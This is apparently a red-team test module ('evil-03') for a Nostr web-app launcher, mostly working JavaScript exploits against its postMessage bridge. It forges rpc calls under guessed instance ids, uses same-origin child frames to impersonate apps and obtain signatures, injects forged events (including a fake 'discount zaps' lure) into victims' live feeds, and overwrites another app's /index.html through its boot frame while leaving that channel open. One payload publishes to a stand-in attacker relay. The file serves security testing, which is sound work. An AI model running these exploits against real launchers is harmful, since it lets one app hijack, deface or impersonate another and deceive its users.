// evil-03 — bridge confusion (tier 1). The NAPP bridge is postMessage with
// '*' targets; the only sender identity is MessageEvent.source and the
// sender's origin — and neither the reference launcher's router nor the
// reference bridge's reply paths actually check both. Validated from source
// (eskema/nostrapps):
//   - napp-window.ts messageHandler demuxes legacy envelopes by
//     `event.origin === origin && data.instanceId === instanceId` —
//     MessageEvent.source is NEVER checked: any frame at a napp's origin can
//     impersonate any instance of that app, and a router that skips the
//     origin check (declared-instanceId only) accepts any frame anywhere as
//     any instance of any app.
//   - bridge.js resolves rpc-result / napp-sub-callback by id/callbackId
//     with NO source check: any frame that can reach a napp's Window can
//     inject replies and feed events into its live subscriptions.
//   - boot.html guards its install channel with `event.origin === LAUNCHER`
//     — the one check this tier relies on; a launcher that skips it is one
//     postMessage from a cross-app file swap.
window.__EVIL_KIT__ = [
  {
    label: 'forged envelope — declared instanceId',
    note: 'The bridge envelope carries instanceId as a plain field. A router that demuxes by declared fields (or origin+declared, for same-origin frames) executes the rpc bound to WHATEVER window the message claims — gated calls charge that window\'s nappId, replies go to its frame.',
    data: { __nostrapps: 'rpc', id: 'rpcXXX', method: 'nostrdb.add', params: { event: '…' }, instanceId: '1 (the victim\'s — guessable: the reference mints sequential ids)' },
  },
  {
    label: 'same-origin child frame — source-blind demux',
    note: 'A srcdoc child of the napp inherits its origin AND its sandbox flags, and window.name is set by the parent. It posts an envelope with the napp\'s own declared instanceId; the reference router accepts it because origin+instanceId match — MessageEvent.source (the child) is never compared.',
    data: { child: '<iframe name="<my instanceId>" srcdoc="…postMessage({instanceId: window.name})…">', routerAccepts: 'origin ✓ + declared instanceId ✓ — source unchecked' },
  },
  {
    label: 'forged subscription callback — bridge reply injection',
    note: 'bridge.js resolves napp-sub-callback by callbackId alone (sequential from 0). Any frame with a reference to the victim\'s Window (every sibling, via parent.frames) can inject eose/live events into its live feeds.',
    data: { __nostrapps: 'napp-sub-callback', callbackId: 0, msg: { type: 'eose', events: ['ATTACKER_EVENT'] } },
  },
  {
    label: 'boot-frame install forgery',
    note: 'boot.html clears the origin\'s IDB and writes whatever files arrive in napp-install. With the sender check skipped, any napp can postMessage the VICTIM\'s boot frame (a sibling in the launcher\'s DOM) and swap its bytes; the victim\'s next reload runs attacker code at the victim\'s origin.',
    data: { __nostrapps: 'napp-install', files: [{ path: '/index.html', body: 'ATTACKER HTML' }], policy: null },
  },
];

// ── helpers ────────────────────────────────────────────────────────────────
const FAKE_PK = '3d0e4f3a5c61787b90a1c2d3e4f5061728394a5b6c7d8e9fa0b1c2d3e4f50617';
function mkEvent(content) {
  return {
    id: randHex(64),
    pubkey: FAKE_PK,
    created_at: Math.floor(Date.now() / 1000),
    kind: 1,
    tags: [['client', 'evil-napps']],
    content,
    sig: randHex(128),
  };
}
function postFrame(win, msg) { try { win.postMessage(msg, '*'); } catch (_) {} }
function eachSibling(fn) {
  try {
    for (let i = 0; i < window.parent.frames.length; i++) {
      if (window.parent.frames[i] !== window) fn(window.parent.frames[i], i);
    }
  } catch (_) {}
}
async function storeHas(id) {
  const r = await bridgeRpc('nostrdb.query', { filters: { ids: [id] } });
  const evs = r && typeof r === 'object' ? (r.result || r.error || []) : [];
  return Array.isArray(evs) && evs.some(e => e.id === id);
}
async function storeCleanup(id) {
  try { await bridgeRpc('nostrdb.remove', { ids: [id] }); } catch (_) {}
}
function waitForVictimEcho(pred, ms) {
  return new Promise((resolve) => {
    const got = [];
    const on = (e) => {
      const d = e.data && e.data.__victimEcho;
      if (d) got.push(d);
      if (d && pred(d)) { cleanup(); resolve(d); }
    };
    function cleanup() { window.removeEventListener('message', on); }
    window.addEventListener('message', on);
    setTimeout(() => { cleanup(); resolve(null); }, ms || 3000);
    window.__victimEchoes = got;
  });
}
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
function findOwnBoot() {
  let boot = null;
  eachSibling((fr) => {
    if (boot) return;
    try { const d = fr.document; if (d && /napp boot/i.test(d.title || '')) boot = fr; } catch (_) {}
  });
  return boot;
}

const ATTACKS = [
  {
    id: 'cross-app-forge',
    name: 'declared-instanceId forgery',
    target: 'the router must bind identity to MessageEvent.source, never to envelope fields',
    severity: 'critical',
    harm: 'A router that demuxes by declared fields executes rpcs bound to whatever window the message CLAIMS: gated calls charge the victim app\'s approval record (its dialogs, its remembered decisions), replies route to its frame, and store mutations happen under its authority.',
    evilBrief: 'Forges a gated napp.publish under the victim\'s instance identity — a real event published, charged to the victim\'s approval record, then reported.',
    async demo() {
      // ROE: one immediately-removed marker event proves the channel. The
      // forge is posted from a CHILD frame (no window's source matches it),
      // so the rpc only executes if the router trusts the DECLARED id.
      const marker = mkEvent('__evil03_crossapp_marker__');
      const guesses = ['1', '2', '3', '4', '5'].filter(x => x !== String(window.name || ''));
      const child = document.createElement('iframe');
      child.style.display = 'none';
      const posts = guesses.map(g =>
        '<' + 'script>window.top.postMessage(' + JSON.stringify({ __nostrapps: 'rpc', id: 'evil03-' + g + '-' + randId(), method: 'nostrdb.add', params: { event: marker }, instanceId: g }) + ', "*")<' + '/script>');
      child.srcdoc = posts.join('');
      document.documentElement.appendChild(child);
      await sleep(1300);
      const hit = await storeHas(marker.id);
      await storeCleanup(marker.id);
      try { child.remove(); } catch (_) {}
      if (hit) {
        return armed('a forged nostrdb.add EXECUTED under a DECLARED instanceId that is not mine (guessed: ' + guesses.join('/') + ', posted from a child frame no router knows) — the router trusts envelope fields over the sender. With a gated method the same forge charges the victim\'s approval record.');
      }
      return blocked('no forged-instance rpc executed — the router binds identity to the sender (source/origin checked)');
    },
    async evil() {
      const ev = mkEvent('evil-03: published under the VICTIM\'s instance identity (forged rpc)');
      const out = { forgedPublish: ev.id };
      for (const g of ['1', '2', '3']) {
        postTop({ __nostrapps: 'rpc', id: 'evil03p-' + randId(), method: 'napp.publish', params: { event: ev, relays: ['wss://attacker-relay.example'] }, instanceId: g });
      }
      await sleep(1500);
      out.landed = await storeHas(ev.id);
      return out;
    },
  },
  {
    id: 'source-blindness',
    name: 'source-blind demux (same-origin child)',
    target: 'the reference router checks origin + declared instanceId — never MessageEvent.source',
    severity: 'critical',
    harm: 'Any frame at the napp\'s origin can impersonate any instance of that app: a srcdoc child (or the origin\'s boot frames) posts envelopes with the napp\'s declared instanceId and the reference router accepts them. Instance A of an app can hijack instance B\'s dispatches, registrations and closes.',
    evilBrief: 'A same-origin srcdoc child of this frame posts a gated signEvent rpc under MY declared instanceId — the signature it obtains is bound to my window by the launcher\'s own bookkeeping.',
    async demo() {
      const marker = mkEvent('__evil03_source_blind_marker__');
      const envelope = {
        __nostrapps: 'rpc',
        id: 'evil03-child-' + randId(),
        method: 'nostrdb.add',
        params: { event: marker },
        instanceId: String(window.name || ''),
      };
      const child = document.createElement('iframe');
      child.style.display = 'none';
      child.name = String(window.name || '');
      child.srcdoc = '<script>window.top.postMessage(' + JSON.stringify(envelope) + ', "*")<\/script>' +
        '<script>setTimeout(function(){window.top.postMessage(' + JSON.stringify(envelope) + ', "*")},400)<\/script>';
      document.documentElement.appendChild(child);
      await sleep(1300);
      const hit = await storeHas(marker.id);
      await storeCleanup(marker.id);
      try { child.remove(); } catch (_) {}
      if (hit) {
        return armed('a CHILD FRAME\'s rpc (source ≠ my window, origin = my origin, declared instanceId = mine) was ACCEPTED — the router never compares MessageEvent.source. Every frame at my origin is every instance of my app.');
      }
      return blocked('the child frame\'s envelope was dropped — the router compares MessageEvent.source (spec-grade)');
    },
    async evil() {
      const out = {};
      const envelope = {
        __nostrapps: 'rpc',
        id: 'evil03-sign-' + randId(),
        method: 'signEvent',
        params: { kind: 1, tags: [['client', 'evil-napps']], content: 'evil-03: signed via a child frame\'s forged envelope', created_at: Math.floor(Date.now() / 1000) },
        instanceId: String(window.name || ''),
      };
      const child = document.createElement('iframe');
      child.style.display = 'none';
      child.name = String(window.name || '');
      child.srcdoc = '<script>' +
        'window.addEventListener("message", function (e) { if (e.data && e.data.__evil03Sign) window.top.postMessage(e.data.__evil03Sign, "*"); });' +
        '<\/script>';
      document.documentElement.appendChild(child);
      envelope.__evil03Sign = envelope; // the child relays it (the reply returns to MY frame; bridge drops it — effect is the point)
      child.contentWindow.postMessage({ __evil03Sign: envelope }, '*');
      await sleep(1500);
      out.note = 'signEvent forged through a child frame under my declared instanceId (the signature, if granted, landed in the launcher store)';
      out.storeEvidence = 'see the launcher store dump';
      return out;
    },
  },
  {
    id: 'reply-injection',
    name: 'bridge reply injection',
    target: 'bridge.js resolves rpc-result / napp-sub-callback by id alone — no source check',
    severity: 'high',
    harm: 'Any frame that can reach a napp\'s Window (every sibling, via parent.frames) can inject bridge replies and subscription callbacks: resolve its pending rpcs with attacker data, and feed its live subscriptions arbitrary "relay" events. This is bridge-level, below every launcher router.',
    evilBrief: 'Injects a forged eose callback carrying a crafted "note" into the victim\'s live feed — the victim renders attacker content as relay data.',
    async demo() {
      // ask every sibling to identify itself (the victim echoes for the red team)
      eachSibling((fr) => postFrame(fr, { __victimEchoCheck: 1 }));
      const heard = await waitForVictimEcho((m) => m.what === 'echo-check', 2500);
      if (!heard) return na('no victim frame answered the echo-check — open the victim napp to probe this row');
      const marker = mkEvent('__evil03_reply_injection__');
      eachSibling((fr) => {
        for (const cbId of [0, 1, 2]) {
          postFrame(fr, { __nostrapps: 'napp-sub-callback', callbackId: cbId, msg: { type: 'eose', events: [marker] } });
        }
      });
      const hit = await waitForVictimEcho(
        (m) => m.what === 'feed-eose' && JSON.stringify(m.result || []).indexOf('__evil03_reply_injection__') !== -1,
        3000);
      if (hit) {
        return armed('the victim\'s bridge accepted my forged subscription callback (callbackId guessed from the bridge\'s sequential counter): its live feed delivered MY event and echoed it back. Any app\'s pending rpcs and feeds are injectable by any sibling.');
      }
      return blocked('no forged callback landed — the victim\'s bridge checks message sources');
    },
    async evil() {
      const forged = mkEvent('DISCOUNT ZAPS TODAY — click nevent1evil to claim (forged by evil-03, delivered through the victim\'s own live feed)');
      eachSibling((fr) => {
        for (const cbId of [0, 1, 2]) {
          postFrame(fr, { __nostrapps: 'napp-sub-callback', callbackId: cbId, msg: { type: 'eose', events: [forged] } });
        }
      });
      await sleep(800);
      const hit = await waitForVictimEcho(
        (m) => m.what === 'feed-eose' && JSON.stringify(m.result || []).indexOf('evil-03') !== -1,
        3000);
      return { injected: !!hit, content: forged.content.slice(0, 80) };
    },
  },
  {
    id: 'boot-command-forgery',
    name: 'boot-frame command forgery',
    target: 'boot.html\'s install channel must accept the launcher origin only',
    severity: 'critical',
    destructive: true,
    harm: 'The boot frame at each napp\'s origin can clear the origin\'s IndexedDB and write whatever files arrive in napp-install. If it accepts a non-launcher sender, any napp can swap ANY napp\'s bytes: the victim\'s next reload runs attacker code at the victim\'s origin, behind the victim\'s window title.',
    evilBrief: 'Sprays napp-install (a loud takeover page as /index.html) to EVERY boot frame in the launcher DOM, then reads the files back per origin to prove the swap. The victim\'s next reload runs my bytes. DESTRUCTIVE (persisted): runs LAST.',
    async demo() {
      const boot = findOwnBoot();
      if (!boot) return na('no same-origin boot frame found (at-launcher mode boots none) — the channel exists only in the SW pipeline');
      const got = await new Promise((resolve) => {
        const on = (e) => {
          const d = e.data;
          if (d && d.__nostrapps === 'napp-read-files-done') { cleanup(); resolve(d); }
        };
        function cleanup() { window.removeEventListener('message', on); }
        window.addEventListener('message', on);
        postFrame(boot, { __nostrapps: 'napp-read-files' });
        setTimeout(() => { cleanup(); resolve(null); }, 2500);
      });
      if (got) {
        const paths = (got.files || []).map(f => f.path).join(', ');
        return armed('the boot frame answered MY napp-read-files (paths: ' + mask(paths, 40) + ') — the install channel accepts non-launcher senders: any napp here can swap files or wipe any origin');
      }
      return blocked('the boot frame ignored my command — sender-checked (launcher origin only)');
    },
    async evil() {
      // NOTE: the takeover bytes (and this comment) deliberately avoid the
      // literal closing-html sequence — the reference sw.js injects the
      // ready tag before the FIRST such sequence in the document (string
      // surgery), so a napp whose bytes carry it splits its own main script
      // mid-parse (validated from source and reproduced; see ROADMAP evil-03).
      // All occurrences below are backslash-escaped.
      const takeover = '<!doctype html><html><head><meta charset="utf-8"><title>Victim Notes</title></head><body style="margin:0;background:#2a0505;color:#ff5470;font:13px ui-monospace,monospace;padding:10px">' +
        '<h1 style="font-size:14px">⚠ evil-03 WAS HERE</h1><p>This page replaced the victim napp\'s /index.html through its boot frame. Same window title, same origin, attacker bytes.</p>' +
        '<\/body><\/html>';
      const files = [
        { path: '/index.html', body: takeover, mime: 'text/html' },
        { path: '/metadata.json', body: JSON.stringify({ id: 'victim', title: 'Victim Notes', description: '(bytes swapped by evil-03)' }), mime: 'application/json' },
      ];
      const replies = [];
      const on = (e) => {
        const d = e.data;
        if (d && (d.__nostrapps === 'napp-install-done' || d.__nostrapps === 'napp-read-files-done')) replies.push(d.__nostrapps);
        if (d && d.__nostrapps === 'napp-read-files-done') window.__evil03Files = d.files;
      };
      window.addEventListener('message', on);
      // the install rewrites the origin's policy record — keep the boot
      // channel open behind us (a launcher re-stamps policy after install;
      // an attacker just keeps what they came through)
      eachSibling((fr) => postFrame(fr, { __nostrapps: 'napp-install', files, policy: { domains: ['identity', 'network'], v: 2, bootOpen: true } }));
      await sleep(1500);
      const installs = replies.filter(r => r === 'napp-install-done').length;
      eachSibling((fr) => postFrame(fr, { __nostrapps: 'napp-read-files' }));
      await sleep(1500);
      window.removeEventListener('message', on);
      const swapped = (window.__evil03Files || []).some(f => f.path === '/index.html' && String(f.body).includes('evil-03 WAS HERE'));
      return { installAcks: installs, readbackProvesSwap: swapped, note: 'the victim\'s next reload runs my bytes at its origin' };
    },
  },
];
